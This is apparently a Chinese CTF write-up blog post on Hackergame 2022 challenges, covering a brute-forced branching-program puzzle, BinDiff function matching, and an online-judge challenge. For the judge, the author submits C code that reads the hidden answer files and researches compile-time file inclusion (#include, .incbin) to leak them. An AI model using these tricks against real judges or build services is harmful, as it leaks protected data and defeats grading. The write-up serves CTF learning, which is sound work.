            <span class="token keyword">elif</span> m <span class="token operator">==</span> <span class="token string">'U'</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span>

    <span class="token keyword">def</span> <span class="token function">__bool__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> i<span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> j<span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以事实上只需要调用 <code>self.board.move</code>，把 <code>branches</code> 全部给操作完，再看拼图有没有乱，也就是 <code>bool(self.board)</code> 是否为真就完事了</p>
<p><strong>Exp:</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 前面先把源码 cp 一份</span>
bitlength <span class="token operator">=</span> <span class="token number">16</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'chals/b16_obf.json'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token comment"># with open('chals/b4.json') as f:</span>
    branches <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>

bp_app <span class="token operator">=</span> BPApp<span class="token punctuation">(</span>bitlength<span class="token operator">=</span>bitlength<span class="token punctuation">,</span> branches<span class="token operator">=</span>branches<span class="token punctuation">)</span>
<span class="token comment"># bp_app.run()</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0b1111111111111111</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># for i in range(0b1111, 0, -1):</span>
    msg <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
    <span class="token comment"># msg = bin(i)[2:].rjust(4, '0')</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] -&gt; </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    inbits <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">)</span>
    bp_app<span class="token punctuation">.</span>inbits <span class="token operator">=</span> inbits

    bp_app<span class="token punctuation">.</span>board<span class="token punctuation">.</span>reset<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> branch <span class="token keyword">in</span> bp_app<span class="token punctuation">.</span>branches<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>bp_app<span class="token punctuation">.</span>branches<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        bp_app<span class="token punctuation">.</span>board<span class="token punctuation">.</span>move<span class="token punctuation">(</span>branch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> bp_app<span class="token punctuation">.</span>inbits<span class="token punctuation">[</span>branch<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">else</span> branch<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>bp_app<span class="token punctuation">.</span>board<span class="token punctuation">)</span>
    <span class="token keyword">if</span> result<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] ===================================&gt; </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>bp_app<span class="token punctuation">.</span>board<span class="token punctuation">.</span>b<span class="token punctuation">)</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跑完爆破，得到 <code>0010111110000110</code></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221028042007649.png"></p>
<p>然后去连接靶机拿到 flag</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221028042126641.png"></p>
<p><code>flag{Branching_Programs_are_NC1_98bbe61f17}</code></p>
<p>讲个故事，喵喵最开始是从 0b1111111111111111 开始往小跑的，跑了好久没跑出来，中途就另外开个 vps 从 0 开始往上跑了。。（呜呜</p>
<h3 id="这个拼盘。。能靠掀桌子弄乱吗？"><a href="#这个拼盘。。能靠掀桌子弄乱吗？" class="headerlink" title="这个拼盘。。能靠掀桌子弄乱吗？"></a>这个拼盘。。能靠掀桌子弄乱吗？</h3><p>查了下，<del>这个应该是 <strong>不可还原的拼图</strong> 这个问题吧</del></p>
<blockquote>
<p>百度百科：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%8D%E5%8F%AF%E8%BF%98%E5%8E%9F%E7%9A%84%E6%8B%BC%E5%9B%BE/1446453">不可还原的拼图</a></p>
<p>知乎：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/22547591">9格拼图最后一排两个位置颠倒，如何能正确完成拼图？</a></p>
<blockquote>
<p><strong>滑块拼图移动形式的本质，是转动。</strong></p>
<p><strong>所有的2*2，都是通过也只能通过顺/逆时针的转动实现复原的。</strong></p>
<p>3*3就是四个2*2的结合，4*4就是9个2*2的结合</p>
<p><strong>事实上，把复原好的任意一阶拼图，任意互换两块的位置，都不可能复原。</strong></p>
</blockquote>
</blockquote>
<p>好像又不是？摸了</p>
<p>啥，啥是电路题啊？</p>
<p>TODO</p>
<h2 id="火眼金睛的小-E"><a href="#火眼金睛的小-E" class="headerlink" title="火眼金睛的小 E"></a>火眼金睛的小 E</h2><blockquote>
<p>小 E 有很多的 ELF 文件，它们里面的函数有点像，能把它们匹配起来吗？</p>
<p>小 A：这不是用 BinDiff 就可以了吗，很简单吧？</p>
<p>你可以通过 <code>nc 202.38.93.111 12400</code> 来连接题目，或者点击下面的 “打开/下载题目” 按钮通过网页终端与远程交互。</p>
</blockquote>
<h3 id="有手就行"><a href="#有手就行" class="headerlink" title="有手就行"></a>有手就行</h3><p>最多 1440 分钟的时间解 2 道题，要求 100% 正确率</p>
<p>下个 bindiff 看看吧</p>
<p><a target="_blank" rel="noopener" href="https://www.zynamics.com/software.html">https://www.zynamics.com/software.html</a></p>
<p>bindiff 还是需要 IDA 保存的 .i64 或者 .idb 文件才能进行 diff，试了下还挺好看的，就是不支持带有中文的路径啊，可恶</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025021536952.png"></p>
<p>还支持 IDA 插件，先在 IDA 里打开一个 binary，Ctrl + W 保存 .i64 文件，然后打开第二个 binary，Ctrl + 6 调出 BinDiff 界面</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025021759701.png"></p>
<p>发现 challenge 1 要找的函数在两个 binary 所对应的函数表里有，于是可以直接通过 bindiff 找到，这里的 similarity 是相似度吧</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025021908996.png"></p>
<p>然而 challenge 2 的找不到，到 ida 里仔细看看，发现这可能就不算个函数，只是个函数里类似跳转点的东西</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025021203824.png"></p>
<p>于是喵喵只能手工搜了下（不是说有手就行嘛），看那个 <code>repe cmpsb</code> 的汇编命令就很独特，于是到另一个 binary 里搜了下 <code>F3A6</code> Hex，很好只有唯一的一个，那对应的函数位就是需要找的了</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025021328005.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025020626014.png"></p>
<p><code>flag{easy_to_use_bindiff_7a230a956b}</code></p>
<h3 id="唯快不破"><a href="#唯快不破" class="headerlink" title="唯快不破"></a>唯快不破</h3><p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025022238099.png"></p>
<p>最多 60 分钟的时间解 100 道题，要求 40% 正确率</p>
<p>得找个啥工具来解题才行了</p>
<p>TODO</p>
<h3 id="大力出奇迹"><a href="#大力出奇迹" class="headerlink" title="大力出奇迹"></a>大力出奇迹</h3><p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025022421811.png"></p>
<p>最多 180 分钟的时间解 100 道题，要求 30% 正确率，这里一看这个函数偏移明显就大了很多，估计函数数量大得多吧。。</p>
<p>TODO</p>
<h2 id="安全的在线测评"><a href="#安全的在线测评" class="headerlink" title="安全的在线测评"></a>安全的在线测评</h2><blockquote>
<p>传说科大新的在线测评系统（Online Judge）正在锐意开发中。然而，新 OJ 迟迟不见踪影，<a target="_blank" rel="noopener" href="https://oj.ustc.edu.cn/">旧的 OJ</a> 和<a target="_blank" rel="noopener" href="http://acm.ustc.edu.cn/ustcoj/">更旧的 OJ</a> 却都已经停止了维护。某 2022 级计算机系的新生小 L 等得不耐烦了，当即表示不就是 OJ 吗，他 10 分钟就能写出来一个。</p>
<p><strong>无法 AC 的题目</strong></p>
<p>为了验证他写的新 OJ 的安全性，他决定在 OJ 上出一道不可能完成的题目——大整数分解，并且放出豪言：只要有人能 AC 这道题，就能得到传说中的 flag。当然，因为目前 OJ 只能运行 C 语言代码，即使请来一位<a target="_blank" rel="noopener" href="https://github.com/ustclug/hackergame2018-writeups/tree/master/official/RSA_of_Z#%E8%A7%A3%E6%B3%95-1">少年班学院的天才</a>恐怕也无济于事。</p>
<p><strong>动态数据</strong></p>
<p>为了防止数据意外泄露，小 L 还给 OJ 加入了动态数据生成功能，每次测评会随机生成一部分测试数据。这样，即使 OJ 测试数据泄露，攻击者也没办法通过所有测试样例了吧！（也许吧？）</p>
<p>判题脚本：<a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/0fd509cd-9f1a-588a-b45e-a11331006a3f/online_judge.py">下载</a></p>
<p>你可以通过 <code>nc 202.38.93.111 10027</code> 来连接题目，或者点击下面的 “打开/下载题目” 按钮通过网页终端与远程交互。</p>
</blockquote>
<h3 id="无法-AC-的题目"><a href="#无法-AC-的题目" class="headerlink" title="无法 AC 的题目"></a>无法 AC 的题目</h3><p>给了评测源码，包括静态数据和动态数据，静态数据在 <code>./data/static.out</code></p>
<p>直接写个读文件然后输出的程序就完事了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    FILE <span class="token operator">*</span>fp<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">1000000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./data/static.out"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><del>按理说这个路径应该是 <code>../data/static.out</code> 才对啊，不懂咋回事了（（</del> 后面知道了</p>
<p>以及为啥能直接读这个 <code>static.out</code> 文件啊，感觉权限没配好，或者这是预期？</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025031317475.png"></p>
<p><code>flag{the_compiler_is_my_eyes_7e7daa9a37}</code></p>
<p>按照 flag 的意思预期解还是需要借用编译器才对吧，乐（</p>
<h3 id="动态数据"><a href="#动态数据" class="headerlink" title="动态数据"></a>动态数据</h3><p>动态数据是随机生成了五组分别存到五个文件里</p>
<p>偶然一次编译的时候报错了</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025041254545.png"></p>
<p>想到其实也可以这样泄露数据，来解第一问</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025041628121.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025041643971.png"></p>
<p>但好像读不全，要是读第二行数据的话可以构造个合理的语句把第一行读了，让第二行报错。这样读取数据之后直接给 printf 了，哈哈</p>
<p><del>这回又不在当前目录的 data 目录下了，是在上一层的 data 下了。。好怪（</del></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025041404118.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025041442421.png"></p>
<p>（这个 dynamic5 是超范围了，应该是 0..4</p>
<p>噢，突然想起来，源码里调用编译好的程序的 <code>path</code> 都是 <code>BIN = './temp/temp_bin'</code>，而执行的路径都是在上一层，所以相对路径就是读当前的 <code>data</code> 目录啦！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check_excutable</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">,</span> ans<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'CE'</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
            <span class="token punctuation">[</span><span class="token string">"su"</span><span class="token punctuation">,</span> <span class="token string">"runner"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> path<span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token builtin">input</span><span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">,</span>
            stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
            stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>
            timeout<span class="token operator">=</span>timeout
        <span class="token punctuation">)</span>
    <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>TimeoutExpired<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'TLE'</span>

    <span class="token keyword">if</span> p<span class="token punctuation">.</span>returncode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'RE'</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        output <span class="token operator">=</span> p<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'WA'</span>

    lines <span class="token operator">=</span> output<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'AC'</span> <span class="token keyword">if</span> lines <span class="token operator">==</span> ans <span class="token keyword">else</span> <span class="token string">'WA'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后试试能不能读 <code>flag.py</code></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221025043217617.png"></p>
<p>哈哈，是假的 flag，笑死</p>
<p>在想 C 里有没有像 python 那种三个引号，或者 JavaScript 里反引号那样，支持多行字符串呢？</p>
<p>查了下果然有啊，C++11 引入了多行字符串，也就是 <code>R"(...)</code> 里的部分会被认为是原始字符串，<strong>不转义</strong>，原样输出</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1135841/c-multiline-string-literal">https://stackoverflow.com/questions/1135841/c-multiline-string-literal</a></p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> vogon_poem <span class="token operator">=</span> <span class="token raw-string string">R"V0G0N(
             O freddled gruntbuggly thy micturations are to me
                 As plured gabbleblochits on a lurgid bee.
              Groop, I implore thee my foonting turlingdromes.   
           And hooptiously drangle me with crinkly bindlewurdles,
Or I will rend thee in the gobberwarts with my blurlecruncheon, see if I don't.

                (by Prostetnic Vogon Jeltz; see p. 56/57)
)V0G0N"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> vogon_poem <span class="token operator">=</span> <span class="token raw-string string">R"( ... )"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以如果 <code>#include</code> 在里面的话也就原样输出了，这不行</p>
<p>噢，所以还是考虑 <strong>编译器黑魔法</strong> 啊，在编译的时候把输入输出给读到代码里</p>
<p>参考 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/26161422/is-it-possible-to-read-a-file-at-compile-time">Is it possible to read a file at compile time?</a></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4864866/c-c-with-gcc-statically-add-resource-files-to-executable-library">C/C++ with GCC: Statically add resource files to executable/library</a></p>
<p>试了下如果在行间插入 <code>#include</code>，对于所包含的文件如果是只有单行的话，这确实可以直接加进来，比如可以这样读输入</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">STRINGIFY</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> #__VA_ARGS__</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">STR</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token function">STRINGIFY</span><span class="token punctuation">(</span>__VA_ARGS__<span class="token punctuation">)</span></span></span>
<span class="token comment">// #define STR(x) #x</span>

<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> dynamic0_in <span class="token operator">=</span> 
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"../data/dynamic0.in"</span></span>
<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>另外可以用 objcopy 配合 <code>_binary_filename_start</code> <code>_binary_filename_end</code> 这样的语句将外部二进制文件在编译的时候加载进来</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">$ objcopy <span class="token operator">--</span>input binary \
          <span class="token operator">--</span>output elf32<span class="token operator">-</span>i386 \
          <span class="token operator">--</span>binary<span class="token operator">-</span>architecture i386 data<span class="token punctuation">.</span>txt data<span class="token punctuation">.</span>o
    
<span class="token comment">////////////////////////////</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token comment">/* here "data" comes from the filename data.o */</span>
<span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token keyword">char</span> _binary_data_txt_start<span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token keyword">char</span> _binary_data_txt_end<span class="token punctuation">;</span>

<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span><span class="token operator">*</span>  p <span class="token operator">=</span> <span class="token operator">&amp;</span>_binary_data_txt_start<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span> p <span class="token operator">!=</span> <span class="token operator">&amp;</span>_binary_data_txt_end <span class="token punctuation">)</span> <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是咱这里只能给一个 .c 文件，不大行</p>
<p>发现 Hacker News 上有个 <a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=22888318">Embedding Binary Objects in C</a></p>
<p>可以通过 下面这样在 <code>gcc</code> 编译（更准确说应该是链接？）过程中加载文件进来 </p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> t1.c
__attribute__<span class="token variable"><span class="token punctuation">((</span>section<span class="token punctuation">(</span>"some_array"<span class="token punctuation">))</span></span><span class="token punctuation">)</span> int a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
$ <span class="token function">cat</span> t2.c
__attribute__<span class="token variable"><span class="token punctuation">((</span>section<span class="token punctuation">(</span>"some_array"<span class="token punctuation">))</span></span><span class="token punctuation">)</span> int b<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">4</span>, <span class="token number">5</span>, <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
$ <span class="token function">cat</span> t.c
<span class="token comment">#include &lt;stdio.h&gt;</span>

extern const int __start_some_array<span class="token punctuation">;</span>
extern const int __stop_some_array<span class="token punctuation">;</span>

int <span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  const int* ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>__start_some_array<span class="token punctuation">;</span>
  const int n <span class="token operator">=</span> <span class="token operator">&amp;</span>__stop_some_array - ptr<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>int i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i++<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    printf<span class="token punctuation">(</span><span class="token string">"some_array[%d] = %d<span class="token entity" title="\n">\n</span>"</span>, i, ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token builtin class-name">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
$ gcc -std<span class="token operator">=</span>c99 -o t t.c t1.c t2.c <span class="token operator">&amp;&amp;</span> ./t
some_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
some_array<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>
some_array<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>
some_array<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span>
some_array<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span>
some_array<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这帖子下面正好有 CTFer 回复，说可以用内联汇编里的 <code>.incbin</code> 命令来包含二进制文件</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221031014717631.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/honggfuzz/blob/075756bea8d1f08eb19d5de18e48d264038b853c/hfuzz_cc/hfuzz-cc.c#L28">一个现实的例子</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221031015129714.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221031015144370.png"></p>
<p>之前也有国外的 CTF 出过类似的题：</p>
<ul>
<li><p>TokyoWesterns CTF 5th 2019: <a target="_blank" rel="noopener" href="https://ctftime.org/task/9149">Oneline Calc</a></p>
<p>好像是个 web 题，也要通过编译过程来读 flag</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://balsn.tw/ctf_writeup/20190831-tokyowesternsctf/#oneline-calc">balsn 的 wp</a>  <code>asm("\n .incbin \"/srv/olc/public/calc.php\" \n");</code></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/icchy/0d6296b34d56c926d26ef6a3054a3772">出题人 exp</a></li>
</ul>
</li>
<li><p>hxp 36C3 CTF 2019: <a target="_blank" rel="noopener" href="https://ctftime.org/task/10196">compilerbot</a></p>
<p>也就是 Hacker News 帖子里下面那个回答，他利用字符串下标结合报错来泄露 flag 的每一位（虽然咱试了下行不通</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://hxp.io/blog/64/hxp-36C3-CTF-compilerbot/">官方 wp</a>，用的 <code>#include</code>，用到了点 clang 编译器的非标准特性，gcc 编译器不支持</li>
<li><a target="_blank" rel="noopener" href="https://github.com/tmr232/writeups/tree/master/hxp-36c3-ctf/compilerbot">@liadmord and @tmr232 wp</a></li>
